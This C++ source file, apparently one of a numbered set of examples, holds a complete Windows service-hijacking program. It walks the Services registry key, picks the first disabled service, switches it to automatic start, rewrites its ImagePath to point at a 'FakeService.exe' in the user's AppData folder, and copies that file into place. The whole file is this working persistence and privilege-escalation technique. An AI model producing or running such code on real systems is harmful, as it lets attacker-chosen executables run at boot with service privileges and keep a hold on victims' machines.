// Example 3 - Services.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <string>
#include <shlwapi.h>
#include <comdef.h>
#include <sstream>
#include <vector>
using namespace std;
void error(DWORD retval) {
	_com_error error(retval);
	wcout << error.ErrorMessage() << endl;
}

int main()
{
	HKEY hkey;
	string s = "SYSTEM\\ControlSet001\\Services";
	long retval = RegOpenKeyExA(HKEY_LOCAL_MACHINE, s.c_str(), 0, KEY_ALL_ACCESS, &hkey);
	if (retval != 0) {
		error(retval);
		return -1;
	}
	DWORD index = 0;
	CHAR buffer[512] = { 0 };
	
	while (TRUE) {
		retval = RegEnumKeyA(hkey, index, buffer, sizeof(buffer));
		if (retval == ERROR_NO_MORE_ITEMS) {
			break;
		}
		index++;
		//cout << buffer << endl;
		//string temp = s;
		string temp(buffer);
		DWORD value;
		DWORD buffersize = sizeof(value);
		
		//cout << temp.c_str() << endl;
		retval = RegGetValueA(hkey, temp.c_str(), "Start", RRF_RT_DWORD, NULL, &value, &buffersize);
		if (retval != 0) {
			//error(retval);
		}
		else {
			//cout << value << endl;
			if (value == 4) {
				cout << "Found: "  << temp << endl;

				string user_directory = getenv("HOMEPATH");
				string full_path = "C:\\";
				full_path.append(user_directory);
				full_path.append("\\AppData\\Local\\FakeService.exe");
				
				value = 2;
				retval = RegSetKeyValueA(hkey, temp.c_str(), "Start", REG_DWORD, &value, sizeof(value));
				if (retval != 0) {
					error(retval);
					value = 4;
					retval = RegSetKeyValueA(hkey, temp.c_str(), "Start", REG_DWORD, &value, sizeof(value));
					break;
				}
				value = 0x10;
				retval = RegSetKeyValueA(hkey, temp.c_str(), "Type", REG_DWORD, &value, sizeof(value));
				if (retval != 0) {
					error(retval);
					break;
				}

				retval = RegSetKeyValueA(hkey,temp.c_str(), "ImagePath", REG_SZ, full_path.c_str(), full_path.length());
				if (retval != 0) {
					error(retval);
					break;
				}
				CHAR cwd[MAX_PATH];
				GetCurrentDirectoryA(MAX_PATH, cwd);
				string cwd_(cwd);
				cwd_.append("\\FakeService.exe");
				cout << cwd_.c_str() << endl;
				retval = MoveFileExA(cwd_.c_str(), full_path.c_str(), MOVEFILE_COPY_ALLOWED);
				
				break;
			}
		}
		
		
	}
	return 0;
}
